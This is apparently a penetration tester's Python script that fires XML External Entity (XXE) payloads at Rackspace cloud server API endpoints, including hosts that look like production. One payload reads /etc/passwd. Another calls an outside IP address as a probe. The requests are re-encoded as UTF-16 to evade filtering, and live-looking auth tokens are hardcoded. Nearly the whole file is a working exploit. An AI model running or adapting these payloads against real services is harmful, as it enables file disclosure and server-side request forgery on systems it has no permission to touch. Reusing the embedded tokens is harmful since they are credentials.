#!/usr/bin/python
# -*- coding: utf-8 -*-
import codecs
import json
from pprint import pprint
import requests
import sys
import struct 
proxyDict = {
#            'http'  : '127.0.0.1:8080',
#            'https' : '127.0.0.1:8080'
            }
#headers = {"Content-type":"application/xml","Host":"servers.api.staging.us.ccp.rackspace.net", "Content-Type": "application/xml; charset=UTF-8", "X-AUTH-TOKEN": '0b89c1a8-fa22-4462-be33-6ccbebf6f7ce'}
headers = {"Content-type":"application/xml","Host":"servers.api.staging.us.ccp.rackspace.net", "Content-Type": "application/xml", "X-AUTH-TOKEN": '0f79a4ff-9573-4989-8061-af32229c885e'}

#r = requests.get("http://10.13.75.140:8080/v1.0/5826071/servers",headers=headers,verify=False,proxies=proxyDict)
#a = json.loads(r.text)
#pprint(a)


request2 = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY a SYSTEM "http://166.78.16.123">
]>
<server xmlns="http://docs.rackspacecloud.com/servers/api/v1.0"
    name="ps-test-newname" adminPass="newPassword">&a;</server>'''


request ='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY a SYSTEM "/etc/passwd">
]>
<server xmlns="http://docs.rackspacecloud.com/servers/api/v1.0"
          name="ps-test"
          imageId="119"
          flavorId="2">&a;
  <metadata>
    <meta
      key="My Server Name">hello&a;</meta>
  </metadata>
</server>
''' 
r = request.encode("utf-16")
r=codecs.BOM_UTF16+r[2:]

r = requests.post("https://10.13.75.204:443/v1.0/5826071/servers",r,headers=headers,verify=False,proxies=proxyDict)
print  r,r.text

r = requests.post("http://api-n04.prod.dfw1.us.cloudcompute.rackspace.net:9090/v1.0/707441/servers/21405668",r,headers=headers,verify=False,proxies=proxyDict)

r = requests.post("http://api-n04.prod.dfw1.us.cloudcompute.rackspace.net:9090/v1.0/707441/servers",r,headers=headers,verify=False,proxies=proxyDict)
print  r.headers,r,r.text

